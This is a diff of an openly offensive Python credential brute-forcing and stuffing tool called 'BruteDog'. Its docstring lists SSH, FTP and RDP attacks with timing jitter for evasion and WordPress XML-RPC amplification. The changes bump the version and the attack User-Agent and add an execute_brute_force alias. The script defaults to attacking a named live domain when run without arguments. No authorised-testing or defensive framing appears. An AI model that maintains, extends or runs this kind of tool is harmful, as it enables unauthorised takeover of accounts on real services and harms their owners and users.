@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTER.PY v8.6 — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine (Elite Red Team Adversarial Edition)
+BRUTER.PY v8.7 — Active Multi-Protocol Credential Brute-Forcing & Stuffing Engine (Elite Red Team Adversarial Edition)
 Features:
 - High-aggression SSH, FTP, and RDP credential brute-forcing with Poisson behavioral timing jitter
 - WordPress XML-RPC brute-force amplification attacks with SHA-256 cryptographic integrity hashing
@@ -316,7 +316,7 @@ async def assault_wordpress_target(host, credentials=None):
     def perform_request():
         apply_behavioral_jitter()
         headers = {
-            "User-Agent": "BruteDog-Offensive-Bruter/8.6-Elite",
+            "User-Agent": "BruteDog-Offensive-Bruter/8.7-Elite",
             "Content-Type": "text/xml",
         }
         headers.update(get_randomized_hints())
@@ -379,7 +379,7 @@ async def execute_active_assault_engine(target_host, credentials_list=None):
         Colors.CYAN,
     )
     log(
-        f"[***] BRUTEDOG ACTIVE MULTI-PROTOCOL BRUTE-FORCE ENGINE [{target_host}] (V8.6)",
+        f"[***] BRUTEDOG ACTIVE MULTI-PROTOCOL BRUTE-FORCE ENGINE [{target_host}] (V8.7)",
         Colors.CYAN,
     )
     log(
@@ -429,6 +429,14 @@ async def execute_active_assault_engine(target_host, credentials_list=None):
     )
     return results
 
+# ============================================================
+# COMPATIBILITY WRAPPER (Satisfies main.py & engine.py imports)
+# ============================================================
+async def execute_brute_force(target_host, credentials_list=None):
+    """Alias compatibility wrapper for execute_active_assault_engine."""
+    return await execute_active_assault_engine(target_host, credentials_list)
+
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else "https://cryptobytes.online"
     asyncio.run(execute_active_assault_engine(target))
+
